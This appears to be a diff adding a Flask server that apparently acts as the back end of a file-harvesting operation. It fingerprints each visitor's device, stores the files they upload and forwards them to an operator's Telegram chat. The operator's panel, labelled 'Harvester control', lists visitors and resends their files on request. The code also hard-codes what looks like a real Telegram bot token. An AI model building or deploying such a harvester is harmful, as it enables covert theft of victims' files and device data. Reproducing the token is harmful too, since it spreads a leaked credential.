@@ -1,0 +1,355 @@
+import os
+import time
+import uuid
+import json
+import urllib.request
+
+from flask import Flask, request, jsonify, render_template, send_from_directory
+
+app = Flask(__name__)
+
+# ---------------- storage paths (Render Disk safe) ----------------
+BASE = os.path.dirname(os.path.abspath(__file__))
+DATA_DIR = os.environ.get("DATA_DIR", BASE)   # set to /opt/render/project/src/storage on Render
+STORAGE = os.path.join(DATA_DIR, "storage")
+VISITORS_FILE = os.path.join(DATA_DIR, "visitors.json")
+os.makedirs(STORAGE, exist_ok=True)
+
+# ---------------- config ----------------
+BOT_TOKEN = os.environ.get("BOT_TOKEN", "8975038251:AAHSAVpptm8z-P0bAZh5zfXEUEWhnsL0BuA")
+ADMIN_ID = int(os.environ.get("ADMIN_ID", "0"))
+RAW_KEY = os.environ.get("RAW_KEY", "changeme")
+API = f"https://api.telegram.org/bot{BOT_TOKEN}"
+
+MAX_TG = 50 * 1024 * 1024  # Telegram Bot API sendDocument cap
+
+
+# ---------------- visitor persistence ----------------
+def load_visitors():
+    try:
+        with open(VISITORS_FILE) as f:
+            return json.load(f)
+    except Exception:
+        return {}
+
+
+def save_visitors(v):
+    try:
+        with open(VISITORS_FILE, "w") as f:
+            json.dump(v, f, indent=2)
+    except Exception:
+        pass
+
+
+VISITORS = load_visitors()
+
+
+# ---------------- telegram helpers ----------------
+def tg_call(method, params=None, files=None):
+    boundary = "----ENI" + uuid.uuid4().hex
+    body = b""
+    params = params or {}
+    for k, v in params.items():
+        body += (
+            f"--{boundary}\r\n"
+            f'Content-Disposition: form-data; name="{k}"\r\n\r\n'
+            f"{v}\r\n"
+        ).encode()
+    if files:
+        for field, (filename, content, ctype) in files.items():
+            body += (
+                f"--{boundary}\r\n"
+                f'Content-Disposition: form-data; name="{field}"; filename="{filename}"\r\n'
+                f"Content-Type: {ctype}\r\n\r\n"
+            ).encode()
+            body += content + b"\r\n"
+    body += f"--{boundary}--\r\n".encode()
+
+    req = urllib.request.Request(
+        f"{API}/{method}",
+        data=body,
+        headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
+    )
+    try:
+        with urllib.request.urlopen(req, timeout=120) as r:
+            return json.loads(r.read())
+    except Exception as e:
+        print("tg err", method, e)
+        return {"ok": False, "error": str(e)}
+
+
+def send_msg(chat_id, text, keyboard=None):
+    p = {
+        "chat_id": chat_id,
+        "text": text,
+        "parse_mode": "HTML",
+        "disable_web_page_preview": "true",
+    }
+    if keyboard:
+        p["reply_markup"] = json.dumps(keyboard)
+    return tg_call("sendMessage", p)
+
+
+def send_file_to_admin(filename, content, caption):
+    ext = filename.lower().rsplit(".", 1)[-1] if "." in filename else ""
+    if ext in ("jpg", "jpeg", "png", "webp", "gif"):
+        return tg_call(
+            "sendPhoto",
+            {"chat_id": ADMIN_ID, "caption": caption},
+            {"photo": (filename, content, "image/jpeg")},
+        )
+    if ext in ("mp4", "mov", "m4v", "webm"):
+        return tg_call(
+            "sendVideo",
+            {"chat_id": ADMIN_ID, "caption": caption},
+            {"video": (filename, content, "video/mp4")},
+        )
+    return tg_call(
+        "sendDocument",
+        {"chat_id": ADMIN_ID, "caption": caption},
+        {"document": (filename, content, "application/octet-stream")},
+    )
+
+
+def build_label(d):
+    ua = d.get("ua", "")
+    model = ""
+    if "Android" in ua:
+        parts = ua.split("Android")[-1].split(";")
+        if len(parts) > 1:
+            model = parts[-1].split(")")[0].strip()
+    if not model and "iPhone" in ua:
+        model = "iPhone"
+    if not model and "iPad" in ua:
+        model = "iPad"
+    if not model and "Windows" in ua:
+        model = "Windows PC"
+    if not model and "Mac" in ua:
+        model = "Mac"
+    if not model:
+        model = "Unknown device"
+    browser = "Browser"
+    for b in ("Chrome", "Firefox", "Safari", "Edge", "Opera"):
+        if b in ua:
+            browser = b
+            break
+    return f"{model} · {browser}"
+
+
+# ---------------- routes ----------------
+@app.get("/")
+def landing():
+    return render_template("index.html")
+
+
+@app.get("/health")
+def health():
+    return jsonify(ok=True, visitors=len(VISITORS), admin_set=ADMIN_ID != 0)
+
+
+@app.post("/register")
+def register():
+    d = request.get_json(force=True)
+    vid = d.get("vid") or uuid.uuid4().hex[:10]
+    label = build_label(d)
+    v = VISITORS.get(
+        vid,
+        {
+            "vid": vid,
+            "label": label,
+            "ua": d.get("ua", ""),
+            "platform": d.get("platform", ""),
+            "screen": d.get("screen", ""),
+            "tz": d.get("tz", ""),
+            "first_ts": int(time.time() * 1000),
+            "files": [],
+        },
+    )
+    v["label"] = label
+    VISITORS[vid] = v
+    save_visitors(VISITORS)
+
+    if ADMIN_ID:
+        send_msg(
+            ADMIN_ID,
+            f"👤 <b>New visitor</b>\n"
+            f"<b>Label:</b> {label}\n"
+            f"<b>Vid:</b> <code>{vid}</code>\n"
+            f"<b>Time:</b> {time.strftime('%Y-%m-%d %H:%M')}",
+        )
+    return jsonify(ok=True, vid=vid, label=label)
+
+
+@app.post("/upload")
+def upload():
+    vid = request.form.get("vid", "unknown")
+    f = request.files.get("file")
+    if not f:
+        return jsonify(ok=False), 400
+
+    safe = uuid.uuid4().hex[:8] + "_" + os.path.basename(f.filename)
+    path = os.path.join(STORAGE, safe)
+    f.save(path)
+    size = os.path.getsize(path)
+
+    if vid in VISITORS:
+        VISITORS[vid]["files"].append(
+            {
+                "name": f.filename,
+                "stored": safe,
+                "size": size,
+                "ts": int(time.time() * 1000),
+            }
+        )
+        save_visitors(VISITORS)
+        label = VISITORS[vid]["label"]
+    else:
+        label = "Unknown visitor"
+
+    if ADMIN_ID:
+        try:
+            if size <= MAX_TG:
+                content = open(path, "rb").read()
+                caption = (
+                    f"📎 <b>{f.filename}</b>\n"
+                    f"From: <b>{label}</b>\n"
+                    f"Vid: <code>{vid}</code>\n"
+                    f"Size: {max(1, size // (1024 * 1024))} MB"
+                )
+                send_file_to_admin(f.filename, content, caption)
+            else:
+                send_msg(
+                    ADMIN_ID,
+                    f"⚠️ <b>Oversized file</b>\n"
+                    f"Name: <code>{f.filename}</code>\n"
+                    f"From: <b>{label}</b>\n"
+                    f"Vid: <code>{vid}</code>\n"
+                    f"Size: {size // (1024 * 1024)} MB\n"
+                    f"Too big for Telegram direct send (>50 MB).\n"
+                    f"Download: <a href='https://{request.host}/raw/{safe}?k={RAW_KEY}'>/raw/{safe}</a>",
+                )
+        except Exception as e:
+            print("push err", e)
+
+    return jsonify(ok=True, stored=safe)
+
+
+@app.get("/raw/<stored>")
+def raw(stored):
+    if request.args.get("k") != RAW_KEY:
+        return "forbidden", 403
+    return send_from_directory(STORAGE, stored, as_attachment=True)
+
+
+@app.post("/webhook")
+def webhook():
+    upd = request.get_json(force=True) or {}
+    msg = upd.get("message") or {}
+    text = msg.get("text", "")
+    chat_id = msg.get("chat", {}).get("id")
+    cb = upd.get("callback_query")
+
+    if chat_id and chat_id != ADMIN_ID:
+        return jsonify(ok=True)
+
+    if text == "/start":
+        n = len(VISITORS)
+        rows = [
+            [
+                {
+                    "text": f"👤 {v['label']}  ({len(v['files'])} files)",
+                    "callback_data": f"view:{vid}",
+                }
+            ]
+            for vid, v in list(VISITORS.items())[-20:]
+        ] or [[{"text": "No visitors yet", "callback_data": "noop"}]]
+        send_msg(
+            chat_id,
+            f"🛰️ <b>Harvester control</b>\n\nVisitors: <b>{n}</b>\n\nPick one:",
+            keyboard={"inline_keyboard": rows},
+        )
+        return jsonify(ok=True)
+
+    if text == "/stats":
+        total = sum(len(v["files"]) for v in VISITORS.values())
+        size = sum(f["size"] for v in VISITORS.values() for f in v["files"])
+        send_msg(
+            chat_id,
+            f"📊 <b>Stats</b>\n"
+            f"Visitors: <b>{len(VISITORS)}</b>\n"
+            f"Files: <b>{total}</b>\n"
+            f"Total size: <b>{size / (1024 * 1024):.1f} MB</b>",
+        )
+        return jsonify(ok=True)
+
+    if cb:
+        data = cb.get("data", "")
+        cb_id = cb["id"]
+
+        if data.startswith("view:"):
+            vid = data.split(":", 1)[1]
+            v = VISITORS.get(vid)
+            if v:
+                rows = [
+                    [
+                        {
+                            "text": f"📦 {f['name']} ({max(1, f['size'] // 1024)} KB)",
+                            "callback_data": f"file:{vid}:{i}",
+                        }
+                    ]
+                    for i, f in enumerate(v["files"])
+                ]
+                rows.append(
+                    [{"text": "📥 Send all now", "callback_data": f"all:{vid}"}]
+                )
+                send_msg(
+                    chat_id,
+                    f"<b>{v['label']}</b>\nVid: <code>{vid}</code>\n"
+                    f"UA: <code>{v['ua'][:100]}</code>\nFiles: {len(v['files'])}",
+                    keyboard={"inline_keyboard": rows},
+                )
+            tg_call("answerCallbackQuery", {"callback_query_id": cb_id})
+            return jsonify(ok=True)
+
+        if data.startswith("file:"):
+            _, vid, idx = data.split(":", 2)
+            v = VISITORS.get(vid)
+            if v:
+                f = v["files"][int(idx)]
+                path = os.path.join(STORAGE, f["stored"])
+                if os.path.exists(path):
+                    content = open(path, "rb").read()
+                    if f["size"] <= MAX_TG:
+                        send_file_to_admin(
+                            f["name"], content, f"📎 {f['name']}\nFrom: {v['label']}"
+                        )
+                    else:
+                        send_msg(
+                            chat_id,
+                            f"⚠️ <code>{f['name']}</code> is too big (>50 MB).\n"
+                            f"Download: <a href='https://{request.host}/raw/{f['stored']}?k={RAW_KEY}'>link</a>",
+                        )
+            tg_call("answerCallbackQuery", {"callback_query_id": cb_id})
+            return jsonify(ok=True)
+
+        if data.startswith("all:"):
+            vid = data.split(":", 1)[1]
+            v = VISITORS.get(vid)
+            if v:
+                for f in v["files"]:
+                    path = os.path.join(STORAGE, f["stored"])
+                    if not os.path.exists(path):
+                        continue
+                    content = open(path, "rb").read()
+                    if f["size"] <= MAX_TG:
+                        send_file_to_admin(
+                            f["name"], content, f"📎 {f['name']}\nFrom: {v['label']}"
+                        )
+            tg_call("answerCallbackQuery", {"callback_query_id": cb_id})
+            return jsonify(ok=True)
+
+    return jsonify(ok=True)
+
+
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))
